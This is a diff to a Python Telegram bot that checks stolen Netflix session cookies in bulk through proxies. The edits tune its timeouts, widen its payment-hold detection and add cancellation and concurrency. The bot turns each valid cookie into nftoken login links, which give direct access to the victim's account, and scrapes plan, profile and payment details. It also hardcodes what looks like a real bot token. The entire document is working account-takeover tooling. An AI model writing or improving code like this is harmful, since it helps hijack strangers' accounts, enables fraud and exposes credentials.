@@ -28,7 +28,7 @@ BOT_TOKEN = os.environ.get("BOT_TOKEN", "8915335839:AAGRpBFdulQwjjsaKvhZ-aiEUtY7
 PORT = int(os.environ.get("PORT", 8000))
 
 # SET YOUR TELEGRAM USER ID HERE (Owner Has Permanent Access)
-OWNER_ID = int(os.environ.get("OWNER_ID", 6420446828))  # Replace 123456789 with your real Telegram User ID
+OWNER_ID = int(os.environ.get("OWNER_ID", 6420446828))
 
 # Set to store approved User IDs (Owner is automatically added)
 APPROVED_USERS: Set[int] = {OWNER_ID}
@@ -161,7 +161,7 @@ def _get_request_proxies() -> Optional[Dict[str, str]]:
 def _is_proxy_live(proxy_str: str) -> Tuple[bool, str]:
     proxies = {"http": proxy_str, "https": proxy_str}
     try:
-        r = requests.get("https://httpbin.org/ip", proxies=proxies, timeout=8, verify=False)
+        r = requests.get("https://httpbin.org/ip", proxies=proxies, timeout=6, verify=False)
         if r.status_code == 200:
             ip = r.json().get("origin", "Unknown IP")
             return True, f"Live! Outbound IP: `{ip}`"
@@ -388,7 +388,7 @@ def _extract_netflix_id_from_cookie_header(cookie_header: str) -> Optional[str]:
             return v.strip()
     return None
 
-def _generate_nftoken(cookie_header: str, timeout_s: int = 20) -> Tuple[bool, str, Optional[str]]:
+def _generate_nftoken(cookie_header: str, timeout_s: int = 8) -> Tuple[bool, str, Optional[str]]:
     netflix_id = _extract_netflix_id_from_cookie_header(cookie_header)
     if not netflix_id:
         return False, "Invalid or expired cookie. NetflixId not found.", None
@@ -435,7 +435,7 @@ def decode_text(value):
     )
     return value.strip()
 
-def _check_netflix_cookie(cookie_header: str, timeout_s: int = 25) -> Dict[str, str]:
+def _check_netflix_cookie(cookie_header: str, timeout_s: int = 10) -> Dict[str, str]:
     cookie_dict: Dict[str, str] = {}
     for token in cookie_header.split(";"):
         token = token.strip()
@@ -530,9 +530,14 @@ def _check_netflix_cookie(cookie_header: str, timeout_s: int = 25) -> Dict[str, 
             or find(r'"maxStreams"\s*:\s*"?([0-9]+)"?')
         )
         
-        # Enhanced Payment Hold / Update Payment Method Detector
+        # Comprehensive Hold Detector Targetting UI Messages & Backend JSON Keys
         hold_patterns = (
             r"(?i)("
+            r"fix\s+your\s+payment|"
+            r"didn['’]t\s+go\s+through|"
+            r"can['’]t\s+process\s+your\s+payment|"
+            r"retry\s+payment|"
+            r"update\s+payment|"
             r"membership\s+is?\s*on\s+hold|"
             r"payment\s+is?\s*on\s+hold|"
             r"update\s+payment\s+method|"
@@ -555,7 +560,7 @@ def _check_netflix_cookie(cookie_header: str, timeout_s: int = 25) -> Dict[str, 
 
         profiles: list = []
         try:
-            rp = session.get("https://www.netflix.com/ManageProfiles", timeout=15, verify=False)
+            rp = session.get("https://www.netflix.com/ManageProfiles", timeout=6, verify=False)
             if rp.status_code == 200:
                 profiles = re.findall(r'"profileName"\s*:\s*"([^"]+)"', rp.text or "")
                 if not profiles:
@@ -722,7 +727,7 @@ async def stop_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return
 
     cancel_bulk_event.set()
-    await update.message.reply_text("🛑 Stop signal sent! Halting the bulk check...")
+    await update.message.reply_text("🛑 **Stop signal set!** The bulk check will halt on the next iteration.")
 
 async def handle_cookie_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
     try:
@@ -734,7 +739,6 @@ async def handle_cookie_text(update: Update, context: ContextTypes.DEFAULT_TYPE)
             await update.message.reply_text(f"🚫 Access Denied!\nYour Telegram User ID is `{user_id}`.\nContact the owner to grant you access.", parse_mode="Markdown")
             return
 
-        # STRICT RULE: Proxy must be set before checking
         if not CURRENT_PROXY:
             await update.message.reply_text(
                 "⚠️ **Proxy Required!**\n\n"
@@ -830,7 +834,6 @@ async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text(f"🚫 Access Denied!\nYour Telegram User ID is `{user_id}`.\nContact owner for access.", parse_mode="Markdown")
         return
 
-    # STRICT RULE: Proxy must be set before checking files
     if not CURRENT_PROXY:
         await update.message.reply_text(
             "⚠️ **Proxy Required!**\n\n"
@@ -892,8 +895,7 @@ async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
         loop = asyncio.get_running_loop()
 
         for idx, (display_name, cookie_raw) in enumerate(cookie_queue, start=1):
-            # Yield control back to event loop so /stop command can execute concurrently
-            await asyncio.sleep(0)
+            await asyncio.sleep(0.01)
 
             if cancel_bulk_event.is_set():
                 logger.info("Bulk check cancelled by user via /stop")
@@ -907,14 +909,17 @@ async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
                 ok, detail, nftoken = await loop.run_in_executor(None, _generate_nftoken, cookie_header)
 
-                # Check cancel flag again after HTTP request returns
                 if cancel_bulk_event.is_set():
-                    logger.info("Bulk check cancelled post-request via /stop")
+                    logger.info("Bulk check cancelled post-nftoken via /stop")
                     break
 
                 if ok and nftoken:
                     acct = await loop.run_in_executor(None, _check_netflix_cookie, cookie_header)
                     
+                    if cancel_bulk_event.is_set():
+                        logger.info("Bulk check cancelled post-account-check via /stop")
+                        break
+
                     phone_link = f"https://www.netflix.com/unsupported?nftoken={nftoken}"
                     desktop_link = f"https://www.netflix.com/browse?nftoken={nftoken}"
 
@@ -994,11 +999,11 @@ def run_bot_in_thread():
     asyncio.set_event_loop(loop)
 
     try:
-        application = ApplicationBuilder().token(BOT_TOKEN).build()
+        application = ApplicationBuilder().token(BOT_TOKEN).concurrent_updates(True).build()
+        
         application.add_handler(CommandHandler("start", start))
         application.add_handler(CommandHandler("help", help_command))
         application.add_handler(CommandHandler("addproxy", addproxy_command))
-        # block=False ensures /stop handler runs concurrently while handle_document is busy
         application.add_handler(CommandHandler("stop", stop_command, block=False))
         application.add_handler(CommandHandler("approve", approve_command))
         application.add_handler(CommandHandler("disapprove", disapprove_command))
